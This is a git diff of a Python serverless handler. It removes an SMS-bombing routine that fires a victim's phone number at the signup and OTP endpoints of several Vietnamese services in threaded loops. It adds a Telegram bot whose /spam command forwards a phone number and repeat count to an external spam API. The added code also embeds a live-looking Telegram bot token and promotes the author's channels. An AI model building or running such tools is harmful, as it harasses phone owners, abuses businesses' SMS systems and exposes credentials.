@@ -1,96 +1,133 @@
 from http.server import BaseHTTPRequestHandler
-from urllib.parse import urlparse, parse_qs
 import json
+import datetime
+import re
 import requests
-from concurrent.futures import ThreadPoolExecutor
-import time
+import os
 
-threading = ThreadPoolExecutor(max_workers=10)
+BOT_TOKEN = '6393252222:AAEWYuwEUdVj7jN0AnhUzO5TPm9E0cOQPjo'
+ADMIN_ID = '6452283369'
+
+def TimeStamp():
+    return str(datetime.date.today())
+
+def send_telegram(chat_id, text):
+    """Gửi tin nhắn về Telegram"""
+    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
+    try:
+        requests.post(url, json={
+            'chat_id': chat_id,
+            'text': text
+        }, timeout=5)
+    except Exception as e:
+        print(f"Lỗi gửi tin nhắn: {e}")
+
+def call_spam_api(phone, amount):
+    """Gọi API spam từ chính Vercel"""
+    try:
+        url = f'https://bot-6tdh.vercel.app/api/spam?phone={phone}&amount={amount}'
+        requests.get(url, timeout=5)
+        return True
+    except:
+        return False
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
-        parsed = urlparse(self.path)
-        params = parse_qs(parsed.query)
+        """Trả về trạng thái bot"""
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain; charset=utf-8')
+        self.end_headers()
+        self.wfile.write(b"Bot Telegram hoat dong!")
+
+    def do_POST(self):
+        """Nhận và xử lý tin nhắn từ Telegram"""
+        content_length = int(self.headers.get('Content-Length', 0))
+        post_data = self.rfile.read(content_length)
         
-        phone = params.get('phone', [''])[0]
-        amount = int(params.get('amount', ['1'])[0])
-        
-        if amount > 10:
-            amount = 10
-        
-        if not phone:
+        try:
+            update = json.loads(post_data)
+        except:
             self.send_response(400)
-            self.send_header('Content-type', 'application/json')
             self.end_headers()
-            self.wfile.write(json.dumps({"error": "Thiếu SĐT"}).encode())
             return
-        
-        # Gọi các API spam chính (rút gọn để phù hợp 10s)
-        for i in range(amount):
-            threading.submit(popeyes, phone)
-            threading.submit(alfrescos, phone)
-            threading.submit(tv360, phone)
-            threading.submit(bibabo, phone)
-            time.sleep(0.3)
-        
+
+        if 'message' in update:
+            message = update['message']
+            chat_id = message['chat']['id']
+            text = message.get('text', '')
+            user_id = message['from']['id']
+            first_name = message['from'].get('first_name', 'Ban')
+
+            response_text = ""
+
+            if text == '/start':
+                response_text = f'''👋 Chào {first_name}!
+🤖 Chào mừng đến với SMS Bot!
+
+📋 Các lệnh:
+/spam <SĐT> <LẦN> - Spam SMS
+/help - Xem hướng dẫn
+/admin - Thông tin Admin
+
+⚠️ Số lần spam tối đa: 10 lần/lượt'''
+
+            elif text == '/help':
+                response_text = '''📋 DANH SÁCH LỆNH:
+━━━━━━━━━━━━━━━━━
+/spam {SĐT} {Số Lần} ✅
+/help ✅
+/admin ✅
+━━━━━━━━━━━━━━━━━
+📌 Ví dụ: /spam 0987654321 5'''
+
+            elif text == '/admin':
+                response_text = '''👤 THÔNG TIN ADMIN:
+━━━━━━━━━━━━━━━━━
+📞 Zalo: https://zalo.me/g/bprmyn080
+📺 YouTube: https://youtube.com/@HDT-TOOL-VN
+🌐 Web: https://linkbio.co/sharetool
+━━━━━━━━━━━━━━━━━'''
+
+            elif text.startswith('/spam'):
+                parts = text.split()
+                
+                if len(parts) < 3:
+                    response_text = '❌ Vui lòng nhập: /spam <SĐT> <SỐ_LẦN>\nVí dụ: /spam 0987654321 5'
+                else:
+                    phone = parts[1]
+                    lap = parts[2]
+
+                    if not lap.isnumeric():
+                        response_text = '❌ Số lần spam phải là số!'
+                    elif int(lap) > 10:
+                        response_text = '❌ Tối đa 10 lần/lượt!'
+                    elif int(lap) < 1:
+                        response_text = '❌ Số lần spam phải lớn hơn 0!'
+                    elif not re.search(r"^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$", phone):
+                        response_text = '❌ Số điện thoại không hợp lệ!'
+                    else:
+                        success = call_spam_api(phone, lap)
+                        if success:
+                            response_text = f'''✅ SPAM THÀNH CÔNG!
+━━━━━━━━━━━━━━━━━
+📱 SĐT: {phone}
+🔄 Số lần: {lap}
+👤 Người dùng: {first_name}
+📅 Ngày: {TimeStamp()}
+━━━━━━━━━━━━━━━━━'''
+                        else:
+                            response_text = f'''⚠️ Đã gửi yêu cầu spam:
+📱 SĐT: {phone}
+🔄 Số lần: {lap}
+(Vui lòng đợi vài giây...)'''
+
+            else:
+                response_text = '🤖 Gõ /help để xem danh sách lệnh!'
+
+            if response_text:
+                send_telegram(chat_id, response_text)
+
         self.send_response(200)
         self.send_header('Content-type', 'application/json')
         self.end_headers()
-        self.wfile.write(json.dumps({
-            "status": "success",
-            "phone": phone,
-            "amount": amount
-        }, ensure_ascii=False).encode())
-
-# ====== CÁC HÀM API (giữ nguyên từ code gốc của bạn) ======
-def popeyes(sdt):
-    headers = {
-        'Host': 'api.popeyes.vn',
-        'accept': 'application/json',
-        'x-client': 'WebApp',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
-        'content-type': 'application/json',
-        'origin': 'https://popeyes.vn',
-        'referer': 'https://popeyes.vn/',
-    }
-    data = '{"phone":"' + sdt + '","firstName":"Cac","lastName":"Lo","email":"kong@gmail.com","password":"12345gdtg"}'
-    try:
-        requests.post('https://api.popeyes.vn/api/v1/register', headers=headers, data=data, timeout=3)
-    except:
-        pass
-
-def alfrescos(sdt):
-    headers = {
-        'Host': 'api.alfrescos.com.vn',
-        'accept': 'application/json',
-        'brandcode': 'ALFRESCOS',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36',
-        'content-type': 'application/json',
-    }
-    data = '{"phoneNumber":"' + sdt + '","secureHash":"66148faf3cab6e527b8b044745e27dbd","deviceId":"","sendTime":1693660146481,"type":1}'
-    try:
-        requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', headers=headers, data=data, timeout=3)
-    except:
-        pass
-
-def tv360(phone):
-    try:
-        requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", 
-            headers={"Content-Type": "application/json"},
-            json={"msisdn":"0"+phone[1:11]}, timeout=3)
-    except:
-        pass
-
-def bibabo(sdt):
-    headers = {
-        "Host": "bibabo.vn",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
-        "Origin": "https://bibabo.vn",
-        "Referer": "https://bibabo.vn/user/signupPhone",
-    }
-    data = {"phone": sdt, "token": "UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"}
-    try:
-        requests.post("https://bibabo.vn/user/verify-phone", headers=headers, data=data, timeout=3)
-    except:
-        pass
+        self.wfile.write(json.dumps({"ok": True}).encode())
